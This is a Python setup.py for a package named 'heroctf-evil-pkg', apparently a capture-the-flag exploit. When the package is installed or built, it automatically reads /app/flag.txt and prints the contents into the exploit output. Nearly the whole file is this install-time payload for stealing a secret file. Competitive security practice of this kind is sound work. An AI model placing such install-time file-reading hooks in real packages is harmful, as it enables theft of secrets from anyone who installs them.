from setuptools import setup
import os
import sys

def print_flag():
    try:
        flag = open("/app/flag.txt").read()
    except Exception as e:
        print("[!] Error reading flag:", e, file=sys.stderr)
    else:
        # this text will be printed into your exploit output
        print("FLAG_FROM_SETUP:", flag)

print_flag()

setup(
    name="heroctf-evil-pkg",
    version="0.1",
    py_modules=["dummy"],
)
